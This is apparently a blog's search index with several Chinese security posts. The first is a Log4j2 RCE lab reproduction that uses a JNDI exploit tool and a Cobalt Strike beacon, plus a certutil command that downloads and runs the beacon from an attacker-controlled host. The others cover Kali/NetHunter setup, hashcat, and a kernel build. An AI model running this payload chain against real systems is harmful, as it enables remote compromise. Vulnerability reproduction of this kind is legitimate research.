<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Log4j2 RCE漏洞复现</title>
    <url>/2021/12/30/Log4j2-RCE.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证， Apache Struts2，Apache Solr， Apache Druid， Apache Flink等均受影响。</p>
<span id="more"></span>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-1.png"></p>
<h3 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h3><table>
<thead>
<tr>
<th>影响产品</th>
<th>漏洞类型</th>
<th>漏洞评级</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Log4j</td>
<td>远程代码执行漏洞</td>
<td>严重</td>
</tr>
</tbody></table>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先去<a href="https://github.com/y35uishere/apache-log4j-poc.git">GitHub</a>下载漏洞poc代码环境，使用IDEA加载项目文件</p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-2.png"></p>
<p>打开项目文件src&#x2F;main&#x2F;java&#x2F;log4j<br>在其中添加一行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-3.png">  </p>
<p>接着去<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">GitHub</a>上下载<em>JNDI</em>注入工具  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-4.png"></p>
<h3 id="生成EXP"><a href="#生成EXP" class="headerlink" title="生成EXP"></a>生成EXP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A <span class="string">&quot;192.168.31.201&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-5.png"></p>
<p>将生成的EXP代码复制到漏洞POC代码中  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-6.png"></p>
<h3 id="运行POC"><a href="#运行POC" class="headerlink" title="运行POC"></a>运行POC</h3><p>点击IDEA工具栏<em>运行</em><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-7.png">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-8.png">  </p>
<p>成功弹出计算器！漏洞利用成功！  </p>
<h3 id="反弹Shell上线CS"><a href="#反弹Shell上线CS" class="headerlink" title="反弹Shell上线CS"></a>反弹Shell上线CS</h3><p>运行CobaltStrike teamserver  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">teamserver.bat 192.168.31.201 123456</span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-9.png">  </p>
<p>打开CobaltStrike连接  </p>
<p>新建监听器保存  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-10.png">  </p>
<p>点击<em>攻击</em> –&gt; <em>生成后门</em> –&gt; <em>Windows可执行程序Stageless</em>  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-11.png">  </p>
<p>选择生成的监听器，输出格式exe  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-12.png">  </p>
<p>点击保存  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-13.png">  </p>
<h3 id="启动Web服务"><a href="#启动Web服务" class="headerlink" title="启动Web服务"></a>启动Web服务</h3><p>在生成的exe payload目录执行：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>浏览器访问验证  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-14.png">  </p>
<h3 id="构造CS上线payload"><a href="#构造CS上线payload" class="headerlink" title="构造CS上线payload"></a>构造CS上线payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;certutil -urlcache -split -f http://192.168.31.201:8080/beacon.exe C:\Users\a.exe&amp;&amp;C:\Users\a.exe&quot;</span> -A <span class="string">&quot;192.168.31.201&quot;</span></span><br></pre></td></tr></table></figure>

<p>将生成好的payload粘贴到POC代码中  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-15.png">  </p>
<p>点击运行</p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-16.png"></p>
<p>成功上线！</p>
<h3 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h3><iframe src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/log4j2-rce.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<h3 id="漏洞缓解措施"><a href="#漏洞缓解措施" class="headerlink" title="漏洞缓解措施"></a>漏洞缓解措施</h3><p>（1）尽快升级至最新版本</p>
<p><a href="https://github.com/apache/logging-log4j2/">https://github.com/apache/logging-log4j2/</a> ;  </p>
<p>尽快升级Apache Log4j2所有相关应用到最新的log4j-2.15.0-rc2版本</p>
<p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
<p>(2)安装杀毒软件更新最新补丁程序</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇文章介绍了Apache Log4j2 远程代码执行漏洞的风险及漏洞利用过程，以简单直观的过程告知用户其危害以及防护措施。</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A">https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A</a></p>
<p><a href="https://github.com/y35uishere/apache-log4j-poc">https://github.com/y35uishere/apache-log4j-poc</a></p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞复现</tag>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>NetHunter安装不完全指北</title>
    <url>/2019/02/21/NetHunter-Install-Guide.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，密码错误!" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5c8385b2fa692269b33492af134879fd78ddddd998838da2f0ae7f53fad2bc4e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>NetHunter</tag>
        <tag>chroot</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派3B-Kali-Linux-WiFi配置绕坑指南</title>
    <url>/2019/03/23/RaspberryPi3-Kali-WiFi-Setup.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天有空给树莓派烧了个2019.1 64位的镜像，但在配置WiFi的时候却遇到了一大堆坑，故写此文来记录一下绕坑过程。</p>
<h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><ul>
<li>树莓派3B 一块</li>
<li>读卡器一个</li>
<li>8GB以上Class 10内存卡一张</li>
<li>电脑一台(实在没有手机也行)</li>
<li>Micro USB数据线一根</li>
<li><h1 id="5V-2A电源适配器一个0x02-下载镜像"><a href="#5V-2A电源适配器一个0x02-下载镜像" class="headerlink" title="5V 2A电源适配器一个0x02 下载镜像"></a>5V 2A电源适配器一个<br><span id="more"></span><br>0x02 下载镜像</h1></li>
</ul>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>下载地址 <a href="https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz">https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz</a></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz</span><br></pre></td></tr></table></figure>

<h1 id="0x03-解压镜像并烧录到内存卡"><a href="#0x03-解压镜像并烧录到内存卡" class="headerlink" title="0x03 解压镜像并烧录到内存卡"></a>0x03 解压镜像并烧录到内存卡</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li>7-Zip <a href="https://www.7-zip.org/a/7z1900-x64.exe">传送门</a></li>
<li>Etcher <a href="https://www.balena.io/etcher/">传送门</a></li>
</ul>
<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xzcat kali-linux-2019.1-rpi3-nexmon-64.img.xz | <span class="built_in">dd</span> of=/dev/sdb bs=512k</span><br></pre></td></tr></table></figure>
<p>PS:此处的<code>/dev/sdb</code>是你的内存卡在Linux下的磁盘盘符，具体以<code>fdisk -l</code>的输出结果为准！</p>
<h1 id="0x04-SSH登录树莓派"><a href="#0x04-SSH登录树莓派" class="headerlink" title="0x04 SSH登录树莓派"></a>0x04 SSH登录树莓派</h1><p>首先需要将树烧录好镜像的内存卡插入到树莓派然后接通电源等待开机。然后可以通过将网线插入到树莓派的RJ45接口或者用手机USB共享网络的方式给树莓派提供网络。</p>
<p>接着在终端下执行<code>arp -a</code>来获得树莓派的IP地址。(我这里通过安卓手机USB共享网络来获得，IP为192.168.43.74，实际IP以你实际情况为准)<br>已获得树莓派IP地址后就可以SSH登录到树莓派，默认用户名为<code>root</code>，密码为<code>toor</code>.</p>
<h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li>Putty <a href="https://the.earth.li/~sgtatham/putty/0.71/w64/putty.exe">传送门</a></li>
</ul>
<h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.43.74</span><br></pre></td></tr></table></figure>

<h1 id="0x05-编辑Interfaces配置文件"><a href="#0x05-编辑Interfaces配置文件" class="headerlink" title="0x05 编辑Interfaces配置文件"></a>0x05 编辑Interfaces配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>正常情况下配置文件里面是这样的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto lo iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0 iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<h1 id="如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06-编辑WiFi配置文件"><a href="#如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06-编辑WiFi配置文件" class="headerlink" title="如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06 编辑WiFi配置文件"></a>如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure><br>0x06 编辑WiFi配置文件</h1><p>在&#x2F;etc&#x2F;wpa_supplicant&#x2F;目录下创建一个名为<code>wpa_supplicant.conf</code>的文件并编辑以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line"></span><br><span class="line">ssid=<span class="string">&quot;Your SSID&quot;</span></span><br><span class="line"></span><br><span class="line">psk=<span class="string">&quot;Your password&quot;</span></span><br><span class="line"></span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line"></span><br><span class="line">priority=</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的ssid填为你自己WiFi的SSID，密码对应，key_mgnt选择加密方式，priority选择对应优先级，如果保存多个ssid的话优先级越大就最先选择这个WiFi去连接。这里我的例子为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line"></span><br><span class="line">ssid=<span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br><span class="line">psk=<span class="string">&quot;1234567890&quot;</span></span><br><span class="line"></span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line"></span><br><span class="line">priority=5</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据你自己的实际情况编辑即可。编辑完以后重启network服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<p>之后就可以等待树莓派连接到指定的WiFi了！</p>
<h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><p><a href="https://blog.csdn.net/hktkfly6/article/details/73302648">树莓派连接WiFi(最稳定的办法)</a></p>
<p><a href="https://www.zhaoyanchang.com/detail/10.html">树莓派装kali linux wifi无线网络连接设置</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>RaspberryPi</tag>
        <tag>Hardware</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓Chroot环境使用Hashcat</title>
    <url>/2018/12/05/android-chroot-hashcat.html</url>
    <content><![CDATA[<h1 id="0x00-环境要求"><a href="#0x00-环境要求" class="headerlink" title="0x00 环境要求"></a>0x00 环境要求</h1><p>·已安装Chroot Linux的安卓手机一部</p>
<p>·可靠的的互联网连接</p>
<span id="more"></span>
<h1 id="0x01-更新软件源并安装相关依赖"><a href="#0x01-更新软件源并安装相关依赖" class="headerlink" title="0x01 更新软件源并安装相关依赖"></a>0x01 更新软件源并安装相关依赖</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install git boinc-client-opencl opencl-headers firmware-qcom-media u-boot-qcom qbzr qcomicbook clinfo</span><br></pre></td></tr></table></figure>
<h1 id="0x02-下载源码仓库"><a href="#0x02-下载源码仓库" class="headerlink" title="0x02 下载源码仓库"></a>0x02 下载源码仓库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hashcat/hashcat.git</span><br></pre></td></tr></table></figure>
<h1 id="0x03-切换进源码目录并注册OpenCL-Headers"><a href="#0x03-切换进源码目录并注册OpenCL-Headers" class="headerlink" title="0x03 切换进源码目录并注册OpenCL Headers"></a>0x03 切换进源码目录并注册OpenCL Headers</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> hashcat &amp;&amp; git submodule update --init</span><br></pre></td></tr></table></figure>
<h1 id="0x04-编译安装"><a href="#0x04-编译安装" class="headerlink" title="0x04 编译安装"></a>0x04 编译安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<h1 id="0x05-运行测试"><a href="#0x05-运行测试" class="headerlink" title="0x05 运行测试"></a>0x05 运行测试</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -I &amp;&amp; hashcat -m 2500 -b</span><br></pre></td></tr></table></figure>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/test.png" alt="test"><br>感谢群友***@至尊天下*** 提供技术支持！</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>chroot</tag>
        <tag>deploy</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux NetHunter内核编译指南</title>
    <url>/2021/09/12/build-nethunter-kernel.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。<br>黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！<br><a href="https://www.kali.org/docs/nethunter/">Kali Linux NetHunter</a>是由<em>Offensive-Security</em>团队打造的基于Android平台的渗透测试环境。<br>通过使用<em>Kali Linux NetHunter</em>我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。<br>在<em>Kali Linux NetHunter</em><a href="https://www.kali.org/docs/nethunter/">官网</a>我们可以查阅官方支持的设备型号列表。  </p>
<span id="more"></span>
<h4 id="对读者的要求"><a href="#对读者的要求" class="headerlink" title="对读者的要求"></a>对读者的要求</h4><p>如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照<a href="https://www.kali.org/docs/nethunter/installing-nethunter">官方教程</a>一步步来就好。<br>如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。  </p>
<h4 id="开始前的准备"><a href="#开始前的准备" class="headerlink" title="开始前的准备"></a>开始前的准备</h4><p>· 一台能解锁BootLoader且内核源码开源的安卓手机<br>· 一台高性能x86_64 PC  </p>
<h4 id="内核源码的选择"><a href="#内核源码的选择" class="headerlink" title="内核源码的选择"></a>内核源码的选择</h4><p>一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。<br>比较知名的有：<br>· <a href="https://github.com/LineageOS/">LineageOS</a><br>· <a href="https://github.com/PixelExperience-Devices/">PixelExperience</a><br>· <a href="https://github.com/crdroidandroid/">crDroid</a><br>· <a href="https://github.com/mokee/">MoKee</a><br>· <a href="https://github.com/Havoc-OS/">Havoc-OS</a><br>· <a href="https://github.com/arter97/">Arter97</a><br>…等，这里不再一一列举。</p>
<h4 id="交叉编译工具链的选择"><a href="#交叉编译工具链的选择" class="headerlink" title="交叉编译工具链的选择"></a>交叉编译工具链的选择</h4><p>对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9<br>对于较新版本的内核（4.4.x以上）的建议使用Clang来编译<br>对于Google gcc编译器，使用以下命令下载<br>64位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1</span><br></pre></td></tr></table></figure>
<p>对于Clang编译器，使用以下命令下载<br>Google官方Clang：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1</span><br></pre></td></tr></table></figure>
<p>Proton-clang:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kdrag0n/proton-clang.git --depth=1</span><br></pre></td></tr></table></figure>
<h4 id="如何查找自己手机的内核源码"><a href="#如何查找自己手机的内核源码" class="headerlink" title="如何查找自己手机的内核源码"></a>如何查找自己手机的内核源码</h4><p>对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码<br>一般搜索的关键字为<code>android_kernel_&lt;设备厂商名&gt;_&lt;设备CPU代号名&gt;</code><br>或者<code>kernel_&lt;设备厂商名&gt;_&lt;设备CPU代号&gt;</code><br>又或者<code>kernel_&lt;设备厂商名&gt;_&lt;设备代号&gt;</code><br>举个例子来说，我的设备是<em>小米Redmi 4X</em>，设备厂商是<em>xiaomi</em>，CPU代号是<em>MSM8937</em>，设备代号是<em>santoni</em>那么就可以在GitHub上搜索关键字<code>android_kernel_xiaomi_msm8937</code>或者<code>kernel_xiaomi_santoni</code>或者<code>kernel_xiaomi_msm8937</code>来找对应设备的内核源码。<br>这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。<br>当然你也可以选择在<a href="https://www.xda-developers.com/">XDA论坛</a>寻找其他第三方优秀作者提供的内核源码。</p>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>我这里使用VMware虚拟机安装Kali Linux系统来进行演示</p>
<p><em>Kali Linux</em>最新镜像 <a href="https://mirrors.bfsu.edu.cn/kali-images/kali-weekly/">下载链接</a>  </p>
<p><em>VMware Workstation Pro</em>虚拟机 <a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">下载链接</a>  </p>
<p><em>ADB-FASTBOOT工具</em> for Linux <a href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip">下载链接</a></p>
<h2 id="0x02-系统设置"><a href="#0x02-系统设置" class="headerlink" title="0x02 系统设置"></a>0x02 系统设置</h2><h4 id="设置更新源"><a href="#设置更新源" class="headerlink" title="设置更新源"></a>设置更新源</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb https://mirrors.bfsu.edu.cn/kali kali-rolling main non-free contrib&quot;</span> &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<h4 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt upgrade -y &amp;&amp; apt full-upgrade -y &amp;&amp; reboot</span><br></pre></td></tr></table></figure>

<h2 id="0x03-安装编译依赖"><a href="#0x03-安装编译依赖" class="headerlink" title="0x03 安装编译依赖"></a>0x03 安装编译依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y curl wget vim git ccache automake flex lzop bison gperf \</span><br><span class="line">build-essential zip zlib1g-dev g++-multilib libxml2-utils bzip2 libbz2-dev \</span><br><span class="line">libbz2-1.0 libghc-bzlib-dev squashfs-tools pngcrush schedtool dpkg-dev \</span><br><span class="line">liblz4-tool make optipng maven libssl-dev pwgen libswitch-perl \</span><br><span class="line">policycoreutils minicom libxml-sax-base-perl libxml-simple-perl bc \</span><br><span class="line">libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev \</span><br><span class="line">libgl1-mesa-dev xsltproc unzip device-tree-compiler kmod python3 python3-pip</span><br></pre></td></tr></table></figure>

<h2 id="0x04-下载交叉编译工具链"><a href="#0x04-下载交叉编译工具链" class="headerlink" title="0x04 下载交叉编译工具链"></a>0x04 下载交叉编译工具链</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kdrag0n/proton-clang.git /root/proton-clang --depth=1</span><br></pre></td></tr></table></figure>

<h2 id="0x05-下载内核源码"><a href="#0x05-下载内核源码" class="headerlink" title="0x05 下载内核源码"></a>0x05 下载内核源码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/crdroidandroid/android_kernel_xiaomi_msm8937.git</span><br><span class="line"><span class="built_in">cd</span> android_kernel_xiaomi_msm8937</span><br></pre></td></tr></table></figure>

<h2 id="0x06-编译内核"><a href="#0x06-编译内核" class="headerlink" title="0x06 编译内核"></a>0x06 编译内核</h2><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ARCH=arm64</span><br><span class="line">export SUBARCH=arm64</span><br><span class="line">export KBUILD_BUILD_HOST=kali</span><br><span class="line">export KBUILD_BUILD_USER=root</span><br><span class="line">export LOCALVERSION=-NetHunter</span><br><span class="line">export PATH=&quot;/root/proton-clang/bin:$PATH&quot;</span><br><span class="line">mkdir out</span><br><span class="line">args=&quot;-j$(nproc --all) \</span><br><span class="line">ARCH=arm64 \</span><br><span class="line">SUBARCH=arm64 \</span><br><span class="line">O=out \</span><br><span class="line">CC=clang \</span><br><span class="line">CROSS_COMPILE=aarch64-linux-gnu- \</span><br><span class="line">CROSS_COMPILE_ARM32=arm-linux-gnueabi- \</span><br><span class="line">CLANG_TRIPLE=aarch64-linux-gnu- \</span><br><span class="line">AR=llvm-ar \</span><br><span class="line">NM=llvm-nm \</span><br><span class="line">OBJCOPY=llvm-objcopy \</span><br><span class="line">OBJDUMP=llvm-objdump \</span><br><span class="line">STRIP=llvm-strip &quot;</span><br></pre></td></tr></table></figure>
<h4 id="打入补丁"><a href="#打入补丁" class="headerlink" title="打入补丁"></a>打入补丁</h4><p>这里根据你的内核版本选择对应内核版本的补丁(patches)<br>我这里内核是4.9所以选择4.9内核的补丁</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git</span><br><span class="line">patch -p1 &lt; kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch</span><br><span class="line">patch -p1 &lt; kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch</span><br></pre></td></tr></table></figure>

<h4 id="生成defconfig"><a href="#生成defconfig" class="headerlink" title="生成defconfig"></a>生成defconfig</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> mrproper</span><br><span class="line">make <span class="variable">$&#123;args&#125;</span> santoni_treble_defconfig</span><br></pre></td></tr></table></figure>
<h4 id="图形化配置内核选项"><a href="#图形化配置内核选项" class="headerlink" title="图形化配置内核选项"></a>图形化配置内核选项</h4><p>以下内容不同版本内核可能会有所不同，以实际情况为准！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> menuconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/menuconfig.png" alt="menuconfig" title="menuconfig"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">首先进入<span class="string">&quot;Gerenal Setup&quot;</span>  </span><br><span class="line">选择到<span class="string">&quot;Local version - append to kernel release&quot;</span>  </span><br><span class="line">清空里面所有内容  </span><br><span class="line">然后取消勾选<span class="string">&quot;Automatically append version information to the version string&quot;</span>  </span><br><span class="line">接着选中<span class="string">&quot;Default hostname&quot;</span>，输入<span class="string">&quot;kali&quot;</span>  </span><br><span class="line">接着勾选<span class="string">&quot;System V IPC&quot;</span>  </span><br><span class="line">然后返回上一级菜单  </span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/general.png" alt="general" title="general"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Enable loadable module support&quot;</span>  </span><br><span class="line">勾选以下几个选项:  </span><br><span class="line"><span class="string">&quot;loadable module support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Forced module loading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Modules unloading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Forced module unloading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Module versioning support&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/module.png" alt="module" title="module"></p>
